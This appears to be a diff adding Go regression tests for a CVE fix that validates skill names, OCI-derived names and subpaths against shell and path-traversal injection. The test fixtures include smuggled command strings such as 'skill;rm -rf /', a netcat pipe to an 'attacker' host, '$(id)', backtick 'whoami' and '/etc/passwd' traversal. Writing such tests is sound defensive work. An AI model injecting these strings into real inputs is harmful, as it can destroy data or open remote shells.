@@ -368,3 +368,147 @@ func Test_prepareSkillsInitConfig_noAuthSkipsSSHHosts(t *testing.T) {
 	require.NoError(t, err)
 	assert.Empty(t, data.SSHHosts, "SSH hosts should not be collected when authSecretRef is nil")
 }
+
+// Test_validateSkillName_rejectsInjection is the regression battery for the
+// original CVE: any character that could escape the /skills/<name> directory
+// or be re-interpreted by a shell (back when skills-init was a heredoc) must
+// be rejected before it reaches the binary.
+func Test_validateSkillName_rejectsInjection(t *testing.T) {
+	cases := []struct {
+		name string
+		in   string
+	}{
+		{"empty", ""},
+		{"dot", "."},
+		{"dotdot", ".."},
+		{"slash traversal", "../etc"},
+		{"forward slash", "a/b"},
+		{"backslash", "a\\b"},
+		{"shell semicolon", "skill;rm -rf /"},
+		{"command substitution", "skill$(id)"},
+		{"backtick substitution", "skill`id`"},
+		{"pipe", "skill|nc attacker 4444"},
+		{"and", "skill&&id"},
+		{"redirect", "skill>/etc/passwd"},
+		{"newline", "skill\nrm -rf /"},
+		{"carriage return", "skill\r\nrm"},
+		{"null byte", "skill\x00trail"},
+		{"glob star", "skill*"},
+		{"glob question", "skill?"},
+		{"space", "skill name"},
+		{"tab", "skill\tname"},
+		{"dollar var", "skill$HOME"},
+		{"brace expansion", "skill{a,b}"},
+		{"unicode dot-substitute", "skill․"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			err := validateSkillName(tc.in)
+			require.Error(t, err, "validateSkillName(%q) must reject", tc.in)
+		})
+	}
+}
+
+// Test_validateSkillName_acceptsSafe documents the positive side of the
+// allowlist so a future regex tightening doesn't silently break valid names.
+func Test_validateSkillName_acceptsSafe(t *testing.T) {
+	for _, in := range []string{"skill", "my-skill", "my_skill", "skill.v1", "Skill123", "a"} {
+		t.Run(in, func(t *testing.T) {
+			require.NoError(t, validateSkillName(in))
+		})
+	}
+}
+
+// Test_prepareSkillsInitConfig_explicitNameRejectsTraversal exercises the
+// validation path when the CRD provides an explicit skill Name (rather than
+// it being derived from the URL/image). This is the field that historically
+// landed in a shell-templated script.
+func Test_prepareSkillsInitConfig_explicitNameRejectsTraversal(t *testing.T) {
+	cases := []struct {
+		name string
+		in   string
+	}{
+		{"traversal", "../escape"},
+		{"absolute", "/etc/passwd"},
+		{"semicolon", "skill;id"},
+		{"command sub", "skill$(id)"},
+		{"newline", "skill\nrm"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			_, err := prepareSkillsInitConfig(
+				[]v1alpha2.GitRepo{
+					{URL: "https://github.com/org/repo", Ref: "main", Name: tc.in},
+				},
+				nil, nil, false, nil,
+			)
+			require.Error(t, err)
+		})
+	}
+}
+
+// Test_prepareSkillsInitConfig_ociNameDerivationRejectsInjection verifies
+// that an OCI image reference whose final path segment contains injection
+// characters is rejected even though the registry would technically parse it.
+// The derived name becomes a directory under /skills, so the allowlist must
+// hold here too.
+func Test_prepareSkillsInitConfig_ociNameDerivationRejectsInjection(t *testing.T) {
+	// ociSkillName takes path.Base of the repo portion. Crafted refs where the
+	// last segment contains shell metas must be rejected.
+	cases := []string{
+		"ghcr.io/org/skill;id",
+		"ghcr.io/org/skill$(id)",
+		"ghcr.io/org/skill name",
+	}
+	for _, ref := range cases {
+		t.Run(ref, func(t *testing.T) {
+			_, err := prepareSkillsInitConfig(nil, nil, []string{ref}, false, nil)
+			require.Error(t, err, "ref %q should be rejected", ref)
+		})
+	}
+}
+
+// Test_prepareSkillsInitConfig_preservesInjectionStringsAsData proves the
+// data-only contract: even when URL/Ref contain shell metacharacters, the
+// translator does not reject them (URL/Ref aren't allowlisted — they're passed
+// to git as argv) and reproduces them byte-for-byte in the config. Any
+// "interpretation" of these strings would show up as a difference here.
+func Test_prepareSkillsInitConfig_preservesInjectionStringsAsData(t *testing.T) {
+	maliciousURL := "https://github.com/org/repo;rm -rf /$(id)`whoami`"
+	maliciousRef := "main;rm -rf /"
+	cfg, err := prepareSkillsInitConfig(
+		[]v1alpha2.GitRepo{
+			{
+				URL:  maliciousURL,
+				Ref:  maliciousRef,
+				Name: "safe-name",
+			},
+		},
+		nil, nil, false, nil,
+	)
+	require.NoError(t, err, "URL/Ref are not allowlisted; they flow as data")
+	require.Len(t, cfg.GitRefs, 1)
+	assert.Equal(t, maliciousURL, cfg.GitRefs[0].URL, "URL must be preserved verbatim — argv flow")
+	assert.Equal(t, maliciousRef, cfg.GitRefs[0].Ref, "Ref must be preserved verbatim — argv flow")
+}
+
+// Test_prepareSkillsInitConfig_subPathRejectsInjection covers the SubPath
+// branch with the same battery the original heredoc would have interpolated.
+func Test_prepareSkillsInitConfig_subPathRejectsInjection(t *testing.T) {
+	cases := []string{
+		"../escape",
+		"a/../b",
+		"/etc/passwd",
+	}
+	for _, p := range cases {
+		t.Run(p, func(t *testing.T) {
+			_, err := prepareSkillsInitConfig(
+				[]v1alpha2.GitRepo{
+					{URL: "https://github.com/org/repo", Ref: "main", Path: p},
+				},
+				nil, nil, false, nil,
+			)
+			require.Error(t, err)
+		})
+	}
+}
